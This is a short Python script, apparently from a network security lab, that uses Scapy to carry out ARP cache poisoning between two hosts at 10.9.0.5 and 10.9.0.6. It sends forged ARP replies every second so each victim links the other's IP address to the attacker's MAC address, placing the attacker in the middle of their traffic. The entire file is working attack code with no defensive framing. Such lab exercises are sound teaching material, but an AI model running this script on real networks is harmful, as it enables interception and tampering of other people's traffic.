#!/usr/bin/env python3
from scapy.all import *
import time

# IP addresses of the victims
victimA_ip = "10.9.0.5"
victimB_ip = "10.9.0.6"

# Attacker MAC will auto-fill from interface
attacker_mac = get_if_hwaddr(conf.iface)

def spoof(victim_ip, spoof_ip):
    packet = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, verbose=False)

print("Starting ARP spoofing. Press CTRL+C to stop...")

try:
    while True:
        spoof(victimA_ip, victimB_ip)   # Tell Host A that Attacker = Host B
        spoof(victimB_ip, victimA_ip)   # Tell Host B that Attacker = Host A
        time.sleep(1)
except KeyboardInterrupt:
    print("ARP spoofing stopped.")
